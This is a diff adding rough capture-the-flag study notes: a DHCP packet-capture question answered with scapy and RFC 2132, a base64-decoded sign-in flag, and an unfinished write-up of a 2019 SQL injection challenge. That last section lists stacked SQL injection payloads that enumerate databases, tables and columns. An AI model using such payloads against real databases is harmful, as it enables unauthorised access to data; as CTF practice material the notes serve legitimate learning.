@@ -1,0 +1,45 @@
+group number 307283889 group entry questions 2 
+what is the host name of this traffic package?
+search RFC2132
+9.6 DHCP Message Type
+This option is used to convey the type of the DHCP message.
+the code for ths option is 53,and its length is 1 
+filter set to bootp
+no     value  message Type   
+2216   7      dhcprelease
+2576   1      dhcpdiscover
+2728   2      dhcpoffer
+2729   3      dhcprequest
+2730   5      dhcpack
+dhcp.option.dhcps unsigned integer(8 bits)
+RFC951 Page 3
+FIELD BYTES DESCRIPTION
+op    1     packet op code / message type 
+            1=BOOTREQUEST,2=BOOTREPLY
+dhcp.type unsigned integer(8 bits)
+
+dhcp.option.hostname RFC2132 3.14 host name option
+The code for the option is 12,and its minimum length is 1
+from scapy.all import rdpcap,IP,UDP,DHCP
+a=rdpcap("DHCP.pcap")
+b=a[2728]
+print(b[IP][UDP][DHCP].options[4][1])
+DEMONB3F5
+
+kctf web sign-in questions 
+import base64
+base64.b64decode("ZmxhZ3t3ZTFjME1FX3RvXzB1Ul9jb050RVNUfQ==")
+flag{we1c0ME_to_0uR_coNtEST}
+kctf web strong network cup 2019 inject as you like
+import urllib3
+h=urllib3.request("GET", "")
+$inject=
+'; SHOW DATABASES;--
+'; SHOW TABLES FROM ...;--
+'; SHOW COLUMNS FROM ... IN ...;--
+from bs4 import BeautifulSoup
+s=BeautifulSoup(h.data,'html.parser')
+b=s.find('pre').get_text()
+import re
+c=re.findall(r'"(.*?)"',b)
+
